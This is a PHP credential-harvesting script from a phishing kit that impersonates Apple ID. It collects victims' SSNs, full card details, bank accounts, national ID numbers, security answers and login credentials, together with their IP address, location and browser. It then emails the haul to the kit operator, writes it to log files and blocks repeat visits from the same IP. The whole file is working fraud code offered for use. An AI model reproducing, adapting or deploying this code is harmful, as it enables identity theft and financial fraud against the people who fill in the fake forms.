<?php
ini_set('display_errors', 0);
@require "assets/includes/functions.php";
@require "config.php";
@require "assets/includes/One_Time.php";
@require "assets/includes/enc.php";
@require "result/detect.php";
@require "result/ipco.php";
if (isset($_POST['mname']) && !empty($_POST['mname'])) {
    $mname = "";
} else {
    $mname = $_POST['mname'];
}
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "".$_SERVER['REMOTE_ADDR']."";
$VictimInfo2 = "".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$userid = $_SESSION["user"];
$password = $_SESSION["pass"];
$epass = $_SESSION["epass"];
$name = $_POST["fname"] . " " . $_POST["mname"] . " " . $_POST["lname"];
$namaz = $_POST["fname"];
$dob = $_POST["dob"];
$address = $_POST["address"];
$city = $_POST["town"];
$state = $_POST["county"];
$postcode = $_POST["postcode"];
$country = $_POST["country"];
$telephone = $_POST["telephone"];
$ssn = $_POST["ssn"];
$ccname = $_POST["ccname"];
$ccno = $_POST["ccno"];
$ccexp = $_POST["ccexp"];
$expiry = $_POST["mm"] . " / " . $_POST["yy"];
$copyexpiry = $_POST["mm"] . "|" . $_POST["yy"];
$citizenid = $_POST['citizenid'];
$qatarid = $_POST['qatarid'];
$naid = $_POST['naid'];
$bans = $_POST['bans'];
$passport = $_POST['passport'];
$civilid = $_POST['civilid'];
$numbid = $_POST['numbid'];
$cardid = $_POST['cardid'];
$cardpassword = $_POST['cardpassword'];
$nabid = $_POST["nabid"];
$bankaccount = $_POST["bankaccount"];
$climit = $_POST['climit'];
$secode = $_POST["secode"];
$acno = $_POST["acno"];
$sort = $_POST["sortcode"];
if ($_POST["q1"] == '' || $_POST["a1"] == '' ) {
  $q1 = '-';
  $a1 = '-';  
} else {
$q1 = $_POST["q1"];
$a1 = $_POST["a1"];}
if ($_POST["q2"] == '' || $_POST["a2"] == '' ) {
  $q2 = '-';
  $a2 = '-';  
} else {
$q2=$_POST["q2"];
$a2=$_POST["a2"];}
if ($_POST["q3"] == '' || $_POST["a3"] == '' ) {
  $q3 = '-';
  $a3 = '-';  
} else {
$q3=$_POST["q3"];
$a3=$_POST["a3"];}
$data_arr = $_POST;
$ip = $_SERVER['REMOTE_ADDR'];
$_SESSION["ip"] = $ip;
$_SESSION["agent"] = $_SERVER['HTTP_USER_AGENT'];$_SESSION["ip"] = $ip;
$_SESSION["agent"] = $_SERVER['HTTP_USER_AGENT'];
$ccno    = str_replace(' ', '', $ccno);
$binq     = str_replace(' ', '', $_POST['ccno']);
$binq     = substr($binq, 0, 6);
$bins = file_get_contents("https://www.cardbinlist.com/search.html?bin=$binq");
$bin = preg_match_all("/headline\":\"(.*)\",\"datePublished/xs", $bins, $binn) ? $binn[1][0] : null;
$bin2 = preg_match_all("/caption\":\"BIN(.*)\",\"width\":\"600\",\"height\":\"400\"}}<\/script>/xs", $bins, $binn2) ? $binn2[1][0] : null;
$bin3 = explode(" ",$bin);
$bin4 = explode(" ",$bin2);
$ccbrand = strtoupper($bin3[2]);
$ccbank  = $bin3[5].' '.$bin3[6].' '.$bin3[7];
$cctype  = strtoupper($bin4[3]);
$ccklas  = strtoupper($bin3[3]);
$data_arr = http_build_query(array_merge($data_arr, $_SESSION));
$headers .= "Content-Type: text/html\r\n";
$headers .= 'From: '.$name.' <sbh@'.$binq.'.com>' . "\r\n";
$subj = $binq . " | ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." [ ".$systemInfo['country']." - $ip ]";
$to = $Your_Email;
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999', '4r5e', '5h1t', '5hit', 'a55', 'anal', 'anus', 'ar5e', 'arrse', 'arse', 'ass', 'ass-fucker', 'asses', 'assfucker', 'assfukka', 'asshole', 'assholes', 'asswhole', 'a_s_s', 'b!tch', 'b00bs', 'b17ch', 'b1tch', 'ballbag', 'balls', 'ballsack', 'bastard', 'beastial', 'beastiality', 'bellend', 'bestial', 'bestiality', 'bi+ch', 'biatch', 'bitch', 'bitcher', 'bitchers', 'bitches', 'bitchin', 'bitching', 'bloody', 'blow job', 'blowjob', 'blowjobs', 'boiolas', 'bollock', 'bollok', 'boner', 'boob', 'boobs', 'booobs', 'boooobs', 'booooobs', 'booooooobs', 'breasts', 'buceta', 'bugger', 'bum', 'bunny fucker', 'butt', 'butthole', 'buttmuch', 'buttplug', 'c0ck', 'c0cksucker', 'carpet muncher', 'cawk', 'chink', 'cipa', 'cl1t', 'clit', 'clitoris', 'clits', 'cnut', 'cock', 'cock-sucker', 'cockface', 'cockhead', 'cockmunch', 'cockmuncher', 'cocks', 'cocksuck ', 'cocksucked ', 'cocksucker', 'cocksucking', 'cocksucks ', 'cocksuka', 'cocksukka', 'cok', 'cokmuncher', 'coksucka', 'coon', 'cox', 'crap', 'cum', 'cummer', 'cumming', 'cums', 'cumshot', 'cunilingus', 'cunillingus', 'cunnilingus', 'cunt', 'cuntlick ', 'cuntlicker ', 'cuntlicking ', 'cunts', 'cyalis', 'cyberfuc', 'cyberfuck ', 'cyberfucked ', 'cyberfucker', 'cyberfuckers', 'cyberfucking ', 'd1ck', 'damn', 'dick', 'dickhead', 'dildo', 'dildos', 'dink', 'dinks', 'dirsa', 'dlck', 'dog-fucker', 'doggin', 'dogging', 'donkeyribber', 'doosh', 'duche', 'dyke', 'ejaculate', 'ejaculated', 'ejaculates ', 'ejaculating ', 'ejaculatings', 'ejaculation', 'ejakulate', 'f u c k', 'f u c k e r', 'f4nny', 'fag', 'fagging', 'faggitt', 'faggot', 'faggs', 'fagot', 'fagots', 'fags', 'fanny', 'fannyflaps', 'fannyfucker', 'fanyy', 'fatass', 'fcuk', 'fcuker', 'fcuking', 'feck', 'fecker', 'felching', 'fellate', 'fellatio', 'fingerfuck ', 'fingerfucked ', 'fingerfucker ', 'fingerfuckers', 'fingerfucking ', 'fingerfucks ', 'fistfuck', 'fistfucked ', 'fistfucker ', 'fistfuckers ', 'fistfucking ', 'fistfuckings ', 'fistfucks ', 'flange', 'fook', 'fooker', 'fuck', 'fucka', 'fucked', 'fucker', 'fuckers', 'fuckhead', 'fuckheads', 'fuckin', 'fucking', 'fuckings', 'fuckingshitmotherfucker', 'fuckme ', 'fucks', 'fuckwhit', 'fuckwit', 'fudge packer', 'fudgepacker', 'fuk', 'fuker', 'fukker', 'fukkin', 'fuks', 'fukwhit', 'fukwit', 'fux', 'fux0r', 'f_u_c_k', 'gangbang', 'gangbanged ', 'gangbangs ', 'gaylord', 'gaysex', 'goatse', 'God', 'god-dam', 'god-damned', 'goddamn', 'goddamned', 'hardcoresex ', 'hell', 'heshe', 'hoar', 'hoare', 'hoer', 'homo', 'hore', 'horniest', 'horny', 'hotsex', 'jack-off ', 'jackoff', 'jap', 'jerk-off ', 'jism', 'jiz ', 'jizm ', 'jizz', 'kawk', 'knob', 'knobead', 'knobed', 'knobend', 'knobhead', 'knobjocky', 'knobjokey', 'kock', 'kondum', 'kondums', 'kum', 'kummer', 'kumming', 'kums', 'kunilingus', 'l3i+ch', 'l3itch', 'labia', 'lmfao', 'lust', 'lusting', 'm0f0', 'm0fo', 'm45terbate', 'ma5terb8', 'ma5terbate', 'masochist', 'master-bate', 'masterb8', 'masterbat*', 'masterbat3', 'masterbate', 'masterbation', 'masterbations', 'masturbate', 'mo-fo', 'mof0', 'mofo', 'mothafuck', 'mothafucka', 'mothafuckas', 'mothafuckaz', 'mothafucked ', 'mothafucker', 'mothafuckers', 'mothafuckin', 'mothafucking ', 'mothafuckings', 'mothafucks', 'mother fucker', 'motherfuck', 'motherfucked', 'motherfucker', 'motherfuckers', 'motherfuckin', 'motherfucking', 'motherfuckings', 'motherfuckka', 'motherfucks', 'muff', 'mutha', 'muthafecker', 'muthafuckker', 'muther', 'mutherfucker', 'n1gga', 'n1gger', 'nazi', 'nigg3r', 'nigg4h', 'nigga', 'niggah', 'niggas', 'niggaz', 'nigger', 'niggers ', 'nob', 'nob jokey', 'nobhead', 'nobjocky', 'nobjokey', 'numbnuts', 'nutsack', 'orgasim ', 'orgasims ', 'orgasm', 'orgasms ', 'p0rn', 'pawn', 'pecker', 'penis', 'penisfucker', 'phonesex', 'phuck', 'phuk', 'phuked', 'phuking', 'phukked', 'phukking', 'phuks', 'phuq', 'pigfucker', 'pimpis', 'piss', 'pissed', 'pisser', 'pissers', 'pisses ', 'pissflaps', 'pissin ', 'pissing', 'pissoff ', 'poop', 'porn', 'porno', 'pornography', 'pornos', 'prick', 'pricks ', 'pron', 'pube', 'pusse', 'pussi', 'pussies', 'pussy', 'pussys ', 'rectum', 'retard', 'rimjaw', 'rimming', 's hit', 's.o.b.', 'sadist', 'schlong', 'screwing', 'scroat', 'scrote', 'scrotum', 'semen', 'sex', 'sh!+', 'sh!t', 'sh1t', 'shag', 'shagger', 'shaggin', 'shagging', 'shemale', 'shi+', 'shit', 'shitdick', 'shite', 'shited', 'shitey', 'shitfuck', 'shitfull', 'shithead', 'shiting', 'shitings', 'shits', 'shitted', 'shitter', 'shitters ', 'shitting', 'shittings', 'shitty ', 'skank', 'slut', 'sluts', 'smegma', 'smut', 'snatch', 'son-of-a-bitch', 'spac', 'spunk', 's_h_i_t', 't1tt1e5', 't1tties', 'teets', 'teez', 'testical', 'testicle', 'tit', 'titfuck', 'tits', 'titt', 'tittie5', 'tittiefucker', 'titties', 'tittyfuck', 'tittywank', 'titwank', 'tosser', 'turd', 'tw4t', 'twat', 'twathead', 'twatty', 'twunt', 'twunter', 'v14gra', 'v1gra', 'vagina', 'viagra', 'vulva', 'w00se', 'wang', 'wank', 'wanker', 'wanky', 'whoar', 'whore', 'willies', 'willy', 'xrated', 'fuck', 'fuckoff', 'fuck off', 'fucking', 'nigger', 'nigerian', 'Nigerian', 'scam', 'cunt', 'wankers', 'twats', 'scammers', 'shit', 'wanker', 'cunt', 'asshole', 'arsehole', 'passwd', 'sample');
include "result/res_ceceh.php";
if ($Encrypt == 1) {
    include("assets/includes/AES.php");
    $imputText = $data;
    $imputKey = $Key;
    $blockSize = 256;
    $aes = new AES($imputText, $imputKey, $blockSize);
    $enc = $aes->encrypt();
    $aes->setData($enc);
    $dec = $aes->decrypt();
}
if ($Abuse_Filter == 1) {
    foreach ($bad_words as $bad_word) {
        if (stristr($_POST['fname'], $bad_word) !== false) {
            mail($to, $warnsubj, $warn, $headers);
            exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
        }
        if (stristr($_POST['address'], $bad_word) !== false) {
            mail($to, $warnsubj, $warn, $headers);
            exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
        }
    }
}
if ($Save_Log == "yooi") {
    if ($Encrypt == "yups") {
        $file = fopen("assets/logs/app.txt", "a");
        fwrite($file, $enc);
        fclose($file);
    } else {
        $file = fopen("assets/logs/app.txt", "a");
        fwrite($file, $data);
        fclose($file);
    }
}
if ($Encrypt == "yups") {
        mail($to, $subj, $enc, $headers);
    } else {
        mail($to, $subj, $data, $headers);
        $empas = "# $bin - $ccbrand - $cctype - $cclevel - $ccbank [ " . $nama_negara . " ]\n";
		$file = fopen("assets/logs/bin.log", "a");
		fwrite($file, $empas);
		fclose($file);
		$file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._ccz_.txt";
		$isi = file_get_contents($file2);
		$buka = fopen($file2, "w");
		fwrite($buka, $isi + 1);
		fclose($buka);
    }
if ($One_Time_Access == 1) {
    $fp = fopen("assets/includes/blacklist.dat", "a");
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
}
?>